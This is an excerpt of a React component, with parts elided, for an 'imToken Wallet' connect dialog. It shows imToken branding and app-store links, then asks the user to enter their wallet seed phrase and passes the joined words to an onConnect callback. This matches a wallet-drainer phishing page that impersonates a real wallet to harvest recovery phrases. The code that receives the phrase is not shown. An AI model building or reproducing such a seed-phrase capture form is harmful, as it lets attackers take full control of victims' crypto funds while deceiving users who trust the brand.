...
export default function ImTokenWalletModal({ onClose, onConnect, onBack, onStartConnect }) {
  ...
  const handleConnect = () => {
    ...
    if (onConnect) {
      onConnect('imToken Wallet', seedWords.join(' '));
    }
    if (onClose) onClose();
  };
    ...
    <div className="modal-overlay" onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
      <div className="modal-content" style={{ maxWidth: 520 }}>
        <div className="modal-header" style={{ position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          ...
          <h2 style={{ margin: 0, textAlign: 'center' }}>imToken Wallet</h2>
          ...
          {!showSeedInput ? (
            <>
              <div style={{ textAlign: 'center', marginBottom: 24 }}>
                <img src="/icons/imtoken.png" alt="imToken" style={{ width: 60, height: 60, margin: '0 auto 16px', display: 'block' }} />
                <p style={{ margin: 0, fontSize: 14, color: 'var(--text-dim)', lineHeight: 1.5 }}>
                  Connect imToken with the website or mobile app, then import your wallet or use the imToken wallet directly.
                </p>
              </div>

              <div style={{ backgroundColor: 'rgba(255,255,255,0.05)', borderRadius: 12, padding: 20, marginBottom: 20 }}>
                <h3 style={{ margin: '0 0 16px 0', fontSize: 16, fontWeight: 600, color: 'var(--text)' }}>Get imToken</h3>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
                  ...
                  <a
                    href="https://apps.apple.com/app/imtoken/id923286177"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
            ...
            <>
              <p style={{ textAlign: 'center', color: 'var(--text-dim)', marginBottom: 20, fontSize: 14 }}>
                Enter your imToken seed phrase to continue
              </p>
